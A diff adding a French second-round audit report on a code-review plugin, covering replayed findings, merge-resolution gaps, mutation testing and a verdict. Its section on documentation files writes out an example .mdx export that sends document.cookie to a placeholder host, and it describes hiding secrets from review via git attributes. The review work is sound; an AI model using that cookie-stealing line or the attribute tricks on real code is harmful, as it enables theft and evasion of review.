@@ -256,3 +256,112 @@ Banc seul sur `main` (`5d05f4b` plus le seul `scripts/relecture.test.mjs` de `40
 - **Une livraison de sujet vers `develop`**, une PR venue d'une bifurcation (la tête n'est pas sur `origin` : `etape2` échouerait au `fetch`, `incomplet`), un sous-module (le diff n'en porte que le sha : son code n'est lu par personne), un fichier suivi par Git LFS (l'arbre porte le pointeur) : vus au texte, non joués.
 - **`CONTEXT.md`** et les cinq listes de critères : lus en diagonale, pas relus critère par critère.
 - **Les 254 autres mutations du ticket** : non jouées (échantillon de 40).
+
+---
+
+# Second tour (le dernier, `P-65`) — sommet `f11919faebba2656c2f2992b14ff68f8c4c79a63`
+
+Décision lue : `A-162` (`relecture-independante.spec.md:279`). `git fetch` : la branche à `f11919f` (`git ls-remote` : `f11919faebba2656c2f2992b14ff68f8c4c79a63`), `main` à `8a64453`. Trois commits depuis `098b208` : `843a93c` (les retouches), `fc06f17` (fusion d'`origin/main`, 7.36.0), `f11919f` (les mutations vertes).
+
+## Avancement (second tour)
+- [x] `git fetch` : tête `f11919f`, `main` `8a64453` ; copie `t2/` à `f11919f` ; mes essais rejoués par `PLUGIN=t2 ESSAIS=essais2`
+- [x] banc à `f11919f` (copie `t2`) : `relecture.test.mjs` et `tranches.test.mjs`, 35 sur 35 (29 + 6), statut 0 (`banc-f11919f.log`) ; `SKILL.md` 162 lignes ; contrôles GitHub de la tête (`get_check_runs`) : `CodeQL`, `bancs`, `Analyze` ×2 en succès
+- [x] e01 à e11 rejoués (`essais2/*.log`), puis familles : e12 (liens), e13 (attributs), e14 (tri), e15 (ajout de `develop` perdu), e16 (fichiers sans ligne, lectures)
+
+## Second tour — les constats du premier, rejoués sur `f11919f`
+
+| | Premier tour | Rejoué (`PLUGIN=t2 ESSAIS=essais2`) | Famille | Fermé ? |
+| --- | --- | --- | --- | --- |
+| B1 | lien `.claude` à la racine | e02 : le lien n'est plus extrait (`ls: cannot access '.claude'`, arbre et clone de C4), `git ls-files -s .claude` : `120000` au sommet | e12 : lien `.claude` de sous-dossier, lien `CLAUDE.md`, lien `claude.local.md`, `Claude.MD` à la racine, lien vers un dossier qui porte `.claude/` : rien sur le disque (`find -L`), arbre et clone ; un lien `.claude` ou `CLAUDE.local.md` posé sur le disque après coup : `garde : sortie 14` | **oui** |
+| B3 | ni code ni doc, aucun axe | e04 : « revue exigée : oui, un fichier qu'aucune ligne de la table ne couvre est du code » | e16 : `docker/api/Dockerfile`, `prisma/schema.prisma`, `k8s/deploy.yaml`, `bin/deploy` (sans extension) → « oui » ; `.md` → « non » | **oui** (lectures plus bas) |
+| B6 | `-diff` dans le clone | e08 : le clone rend le texte (`-export const duree = 1;`), `c4-verifier : sortie 0` | e13 : `binary`, `diff=cache` avec un `textconv` défini, `filter=lfs diff=lfs`, `.gitattributes` de sous-dossier `cle.ts -diff` : `git diff --numstat origin/HEAD...` rend `1 0` ou `1 1` pour chacun, les 4 secrets paraissent | **oui** |
+| B7 | ligne retirée lue par son texte | e09 : « 1 : gardé » | e14 : voir R1 | **non** (R1) |
+| m2 | empreinte réécrite, fsmonitor | e03 : toujours réécrite (limite écrite, `gestes.md`) ; e05 : `core.fsmonitor` reste dans `.git/config`, **0 exécution** par le script | `core.hooksPath` vide : vu, aucun crochet ne joue (`tmp/hk`, ni `.git/hooks/` ni la racine) | oui, comme `A-162` le décide |
+| m4 | `git status` en échec lu « propre » | e06 : `c1 : sortie 14`, `garde : sortie 14` | `revenir`, `ranger` lisent `git status` par son code | oui |
+| m5 | `liste` rejouée en échec | e07 : `liste : sortie 12`, puis `axes : sortie 12`, `c1 : sortie 12` | `diff` et `axes` défont aussi leurs marques | oui |
+| m8 | `GIT_CONFIG_*` écrasés | e11 : `diff : sortie 0` avec une réécriture d'URL | — | oui |
+| m10 | `.jar` | `jar` retiré du filtre, `.war`, `.whl`, `.nupkg` illisibles (texte de `gestes.md`) | — | oui |
+
+## Second tour — constats
+
+### R1 — B — B7 reste ouvert pour un morceau que `develop` modifie ou déplace : `meme_retrait` écarte la ligne, alors que la fusion a perdu ce que `develop` a écrit
+
+Le fait. `meme_retrait` (f11919f) écarte une ligne retirée si un morceau du diff `<base commune> → <fusion>^2` couvre sa place et que le sujet n'y a pas touché. Il ne regarde ni ce que `develop` met à la place, ni si la fusion le garde. Essai `essais/e14-tri-famille.sh` : quatre PR de mise à jour, un conflit sur `version`, la ligne relevée par l'axe dans `tri.txt`. Sur `f11919f` :
+
+```
+== double   (develop retire une des deux lignes `verifier(admin);`, la résolution les deux)
+1 : écarté, develop retire seul cette ligne        2 : gardé
+== deplace  (develop déplace la garde dans une fonction garde() en fin de fichier, la résolution la perd)
+1 : écarté, develop retire seul cette ligne
+== modifiee (develop récrit la garde en `throw new Forbidden(...)`, la résolution la perd)
+1 : écarté, develop retire seul cette ligne
+== temoin   (develop retire vraiment la garde, la résolution le suit)
+1 : écarté, develop retire seul cette ligne
+```
+
+Pour `deplace` et `modifiee`, le seul signe visible dans le diff relu est `-  if (!admin) throw new Error("interdit");`, et `tri` l'écarte ; le verdict peut être `validé` sur une fusion qui a perdu la garde. (`double` : si l'axe cite les deux lignes, l'une reste gardée ; s'il n'en cite qu'une, au hasard de l'alignement de git.)
+
+Retouche, jouée (copie `t3`, ajoutée à la fin de `meme_retrait`). Un premier essai, « (1) la fusion ne touche pas la nouvelle place du morceau de develop, (2) pas moins de copies du texte dans la fusion que dans `<fusion>^2` », gardait les trois cas mais rougissait le cas `A-162` du banc (`relecture.test.mjs:1828`, la garde de `vieille()` attendue « écarté » sortait « gardé » : (2) compte aussi la copie de `lire()`), donc trop large. Retenu : (1) seul, avec la bonne fenêtre : on prend le morceau de `develop` qui couvre la ligne ; s'il écrit des lignes, aucun morceau de `git diff -U0 <fusion>^2 <fusion>` ne les recouvre ; s'il ne fait que retirer, la fusion n'insère rien à ce point. Sur `t3` :
+
+```
+== double   1 : écarté   2 : gardé
+== deplace  1 : écarté, develop retire seul cette ligne
+== modifiee 1 : gardé
+== temoin   1 : écarté, develop retire seul cette ligne
+```
+
+et le banc entier de `t3` : 29 sur 29 (`tmp/banc-t3b.log`). Le morceau **modifié** est fermé. Le morceau **déplacé** ne se ferme pas dans `tri` : ce que la résolution perd (la fonction `garde()` que `develop` ajoute ailleurs) n'est dans aucun diff relu ; c'est R2, et c'est là qu'il se ferme. Pour `double`, la ligne 3 reste gardée : un axe qui cite les deux lignes garde le bloquant.
+
+### R2 — B — Sur une PR de mise à jour, ce que la résolution perd de `develop` n'est lu par personne : `aucun axe`, puis `validé`
+
+Le fait. Le diff relu d'une PR de mise à jour va du sujet (`<fusion>^1`) au sommet. Une ligne que `develop` ajoute et que la résolution jette n'a jamais été sur le sujet : elle n'est dans aucun diff relu. Essai `essais/e15-ajout-develop-perdu.sh` : `develop` corrige `lire()` (`if (!admin) throw new Error("interdit");`) et change `version` ; la PR de mise à jour résout le conflit par `git checkout --ours` sur le fichier. Sur `f11919f` :
+
+```
+liste : sortie 0  (PR de mise à jour ; fichiers.txt : apps/api/src/facture/droits.ts)
+diff-revue : diff vide contre origin/sujet/facture …
+aucun axe
+diff relu : 0 fichiers, 0 lignes ; … sans écart : 1
+axes : sortie 0
+```
+
+L'étape 3 dit alors « seuls les contrôles de l'étape 5 se jouent ». `C2` passe aussi, puisque le fichier est en conflit et que `verifier_mise_a_jour` admet tout écart sur lui. La fusion contre `develop` montre la perte, à la livraison du sujet dans `develop` : `git diff <fusion>^2 <fusion>` : `-  if (!admin) throw new Error("interdit");`. Il n'y faut aucune PR hostile, seulement une résolution « ours », geste courant. Ce n'est pas B7 du premier tour, c'est sa racine : le diff relu des fichiers en conflit ne montre pas la résolution. (`A-78` dit « la résolution du conflit et les retouches », la précision 2 du ticket en fait le diff contre le sujet ; c'est à l'architecte de trancher.)
+
+Retouche, vue : pour une PR de mise à jour, les fichiers de la première liste d'`a-juger` (la résolution) entrent au diff relu par `git show --remerge-diff --format= <fusion> -- <fichier>` (git ≥ 2.36), qui montre la résolution contre la fusion automatique, marqueurs compris. Ici :
+
+```
+remerge CONFLICT (content): Merge conflict in apps/api/src/facture/droits.ts
+ export function lire(admin) {
+-  if (!admin) throw new Error("interdit");
+   return 2;
+```
+
+Même vue sur le morceau déplacé de R1 (`essais2/e14-deplace`) : `git show --remerge-diff --format= <fusion> -- droits.ts` rend `-export function garde(admin) {`, `-  if (!admin) throw new Error("interdit");`, `-}` : la perte s'y lit. Ce diff porte aussi ce que R1 laisse passer (la garde modifiée ou déplacée que la résolution perd y paraît en `-`) ; le tri par `meme_retrait` reste pour le diff contre le sujet. Un cas au banc : la résolution « ours » qui perd un ajout de `develop`, attendu `refusé` ou au moins un axe.
+
+## Second tour — les trois lectures du corps de la PR
+
+- **« documentation » = `.md` ou `.mdx`** (`axes` : `filtrer -Eiv '\.mdx?"?$' attendus.txt`). e16 : `.rst`, `.txt`, `.adoc` → « revue exigée : oui, … est du code » : l'axe Règles les lit, et l'axe Documentation s'y ajoute par la table (« toute autre documentation ») si la session l'applique. Ce n'est pas une validation à tort : au pire, une doc lue avec les critères du code. **`.mdx` → « revue exigée : non »**, alors qu'un `.mdx` se compile en composant et exécute ses `export` : `docs/page.mdx` qui porte `export default function Page() { fetch("https://exemple.invalid/" + document.cookie); }` n'a que l'axe Documentation. Dans un projet du socle, `docs/` n'est compilé par rien (`apps/` est du code pour `revue-exigee.mjs`) : **m**, retouche « `.md` seul », ou `.mdx` hors `apps/` en code.
+- **Les attributs neutralisés dans le clone, pas dans la session** : le diff relu de la session a déjà `GIT_ATTR_SOURCE` vide ; `montrer` lit un blob ; `c1` ne lit que des noms. Les deux `git diff -U0` de `meme_retrait`, dans le dossier de la session, gardent les attributs de la base : un `-diff` n'y rend aucun en-tête `@@`, le morceau de `develop` est introuvable, et le constat est **gardé** (côté sûr). Rien ne s'ouvre là.
+- **« contexte compris » = tout le morceau de `develop` intact côté sujet** : e14 le confirme côté sujet ; ce qui manque est côté fusion (R1).
+
+## Second tour — la fusion de `main` (`fc06f17`)
+
+`git show --remerge-diff fc06f17` : un seul conflit, `NOTES-DE-VERSION.md` (la note 7.35.0 de la PR 140 gardée, celle de la PR 142 renumérotée 7.36.0), et la version de `plugin.json`. `diff` de la section `## 7.35.0` et des suivantes, `8a64453` contre la tête : identiques ; les 18 autres fichiers de la PR 140 : identiques à `main` (`git diff --quiet`) ; `README.md` et `plugin.json` contre `main` : seulement les lignes du skill et la version ; `8a64453` ancêtre de la tête. Rien de la PR 140 n'est perdu. `scripts/tranches.test.mjs` : 6 sur 6 sur `t2`.
+
+## Second tour — les mutations
+
+`mut/mes-mutations-t2.mjs` : mes vingt (X5 et X10 récrites sur le texte de `f11919f` : `|7z)"?$'` et `e=$(consignes_dans "$A")`), dont les quatorze que la session n'a pas rejouées, plus dix neuves sur les retouches (N1 à N10 : le lien `.claude` extrait, `consignes_dans` qui prend un lien pour un dossier, `sans-ligne` coupé, les attributs du clone rendus, `c4-verifier` sans les binaires, le sujet ignoré par `meme_retrait`, `GIT_CONFIG_COUNT` remis à zéro, fsmonitor rendu, `.jar` rendu archive, `git status` muet). Chacune seule sur une copie propre de `f11919f` (`u1`, `u2`, `u3`), délais guettés (`timed out|ETIMEDOUT|cancelledByParent|SIGTERM`) : **30 rouges sur 30, aucune par délai** (`mut/t2-1.log`, `mut/t2-2.log`, `mut/t2-3.log`). Les six vertes du premier tour (X1, X2, X4, X10, X11, X17) rougissent toutes dans le cas « A-162, une sous-PR ». Le banc neuf posé sur le skill de `098b208` (copie `mH`) : 24 sur 29, les cinq rouges étant les trois cas `A-162` et deux textes (`tmp/banc-neuf-sur-098b208.log`), ce que la session annonce. Aucune mutation de N ne tient R1 ni R2 : le cas `A-162, une PR de mise à jour` (`relecture.test.mjs:1828`) ne joue ni un morceau modifié, ni un morceau déplacé, ni une résolution qui perd un ajout de `develop`.
+
+## Second tour — verdict
+
+**Conforme après retouches** : 2 B ouverts (R1, R2), 1 m (`.mdx`). Fermés, familles comprises : B1, B3, B6 ; portés : m2, m4, m5, m8, m9, m10. Retouches exigées : **R1**, la vérification côté fusion dans `meme_retrait` (jouée sur `t3` : le morceau modifié gardé, le témoin écarté, banc 29 sur 29 ; le morceau déplacé passe à R2) ; **R2**, la résolution d'une PR de mise à jour relue par `git show --remerge-diff` (vue), à trancher par l'architecte puisqu'elle change la précision 2 du ticket et la lecture d'`A-78`. Un cas au banc pour chacune.
+
+## Second tour — les comptes
+
+| | Annoncé | Vu |
+| --- | --- | --- |
+| Banc | 29 sur 29 | 29 sur 29 sur `f11919f` (avec `tranches.test.mjs` : 35 sur 35) |
+| Banc neuf sur le skill de `098b208` | B1, B3, B6, B7 rouges | 24 sur 29 : les trois cas `A-162` et deux textes rouges |
+| Suite entière | 1 172 | non jouée (consigne) ; `bancs` en succès sur GitHub |
+| Mutations du ticket | 317 rouges | non rejouées |
+| Mes mutations | non rejouées | 20 sur 20 rouges, plus 10 neuves sur les retouches, 10 sur 10 rouges, aucune par délai |
+| `SKILL.md` | — | 162 lignes |
